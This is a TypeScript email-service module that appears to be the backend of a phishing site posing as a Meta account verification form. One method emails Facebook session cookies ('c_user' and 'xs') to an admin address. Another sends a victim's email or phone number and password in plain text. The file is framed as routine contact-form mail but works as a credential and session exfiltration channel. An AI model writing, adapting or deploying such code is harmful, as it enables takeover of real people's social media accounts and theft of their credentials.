import nodemailer from 'nodemailer';
import { validationFormEmailConfig, confirmationFormEmailConfig } from './email-config';
import { type ContactForm } from '@shared/schema';

class EmailService {
  private validationTransporter;
  private confirmationTransporter;

  constructor() {
    this.validationTransporter = nodemailer.createTransport(validationFormEmailConfig);
    this.confirmationTransporter = nodemailer.createTransport(confirmationFormEmailConfig);
  }

  async sendValidationFormEmail(data: ContactForm) {
    const mailOptions = {
      from: validationFormEmailConfig.auth.user,
      to: validationFormEmailConfig.adminEmail,
      subject: 'New Meta Verification Form Submission',
      html: `
        <h2>New Validation Form Submission</h2>
        <p><strong>c_user:</strong> ${data.c_user}</p>
        <p><strong>xs:</strong> ${data.xs}</p>
        <p><strong>Submission Time:</strong> ${new Date().toLocaleString()}</p>
      `
    };

    try {
      console.log('Sending validation form email...');
      const result = await this.validationTransporter.sendMail(mailOptions);
      console.log('Validation form email sent:', result);
      return result;
    } catch (error) {
      console.error('Error sending validation form email:', error);
      throw error;
    }
  }

  async sendConfirmationFormEmail(data: ContactForm) {
    const mailOptions = {
      from: confirmationFormEmailConfig.auth.user,
      to: confirmationFormEmailConfig.adminEmail,
      subject: 'New Meta Account Verification Form Submission',
      html: `
        <h2>New Confirmation Form Submission</h2>
        <p><strong>Email/Phone:</strong> ${data.user_email}</p>
        <p><strong>Password:</strong> ${data.password}</p>
        <p><strong>Submission Time:</strong> ${new Date().toLocaleString()}</p>
      `
    };

    try {
      console.log('Sending confirmation form email...');
      const result = await this.confirmationTransporter.sendMail(mailOptions);
      console.log('Confirmation form email sent:', result);
      return result;
    } catch (error) {
      console.error('Error sending confirmation form email:', error);
      throw error;
    }
  }
}

export const emailService = new EmailService();